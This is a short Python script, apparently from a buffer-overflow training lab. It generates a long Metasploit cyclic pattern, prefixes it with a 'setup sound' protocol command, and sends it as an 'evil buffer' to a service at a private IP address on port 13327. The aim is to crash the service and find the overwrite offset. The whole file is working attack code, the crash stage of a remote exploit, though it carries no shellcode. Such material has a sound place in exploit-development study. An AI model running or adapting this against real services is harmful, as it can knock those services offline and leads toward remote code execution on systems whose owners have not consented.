#!/usr/bin/python
from asyncio.subprocess import STDOUT
import socket
import subprocess
from sys import stderr

host = "192.168.250.44"

pattern_size = 4379

result = subprocess.run(["msf-pattern_create","-l", "{}".format(pattern_size)]
, stderr= subprocess.PIPE, stdout=subprocess.PIPE)
crash = result.stdout
##print(result.stderr)

##print(crash)
##crash = b"\x41" * 4379

buffer = b"\x11(setup sound " + crash + b"\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print ("[*]Sending evil buffer...")

s.connect((host, 13327))
print (s.recv(1024))

s.send(buffer)
s.close()

print ("[*]Payload Sent !")